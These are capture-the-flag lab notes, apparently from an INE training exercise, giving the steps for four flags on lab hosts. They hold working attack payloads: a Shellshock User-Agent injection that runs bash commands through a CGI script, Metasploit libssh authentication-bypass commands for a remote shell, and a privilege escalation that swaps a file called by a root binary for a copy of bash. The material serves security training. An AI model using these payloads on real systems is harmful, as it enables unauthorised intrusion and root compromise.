# Flag 1
Check the root ('/') directory for a file that might hold the key to the first flag on target1.ine.local.

This is the .cgi,
so intercept the request and change the `User-Agent` to 
```Burp
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cd ../../../ && cat flag.txt'
```
# Flag 2
In the server's root directory, there might be something hidden. Explore '/opt/apache/htdocs/' carefully to find the next flag on target1.ine.local.

similarly
```
User-Agent: () { :; }; echo; echo; /bin/bash -c 'cd ../../../opt/apache/htdoc && ls-la'

User-Agent: () { :; }; echo; echo; /bin/bash -c 'cd ../../../opt/apache/htdoc && cat .flag.txt'
```

# Flag 3
Investigate the user's home directory and consider using 'libssh_auth_bypass' to uncover the flag on target2.ine.local.

```
msfconsole
search libssh_auth_bypass
use 0
set RHOSTS
set SPAWN_PTY true
run

sessions
sessions -i <id>

/bin/bash -i

cd home
ls
cd user
ls
cat fag.txt
```

# Flag 4
The most restricted areas often hold the most valuable secrets. Look into the '/root' directory to find the hidden flag on target2.ine.local.
```
whoami
groups <name>

ls -la
./welcome

file welcome
strings welcome
(see the greetings in the strings)

rm greetings
cp /bin/bash greetings
ls

rerun the file:
./welcome
id
cd /root
cat flag.txt
```